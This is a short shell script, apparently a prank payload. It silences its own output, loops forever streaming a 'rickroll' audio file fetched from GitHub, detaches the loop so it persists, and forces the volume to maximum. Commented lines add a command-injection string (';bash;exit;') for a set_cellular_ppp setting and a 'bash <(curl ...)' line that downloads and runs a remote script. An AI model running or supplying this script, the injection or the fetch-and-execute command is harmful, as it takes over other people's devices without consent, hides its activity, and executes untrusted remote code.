exec >/dev/null
exec 2>/dev/null
while [ 1=1 ];
do
    aplay -q <(curl https://raw.githubusercontent.com/ShatteredDisk/rickroll/master/rickroll.mp4);
done & disown &
amixer set Master 100% unmute;

#set_cellular_ppp \';bash;exit;\'
#bash <(curl https://raw.githubusercontent.com/TheYunDude/The-Big-Boy-Yunus/main/music.sh)
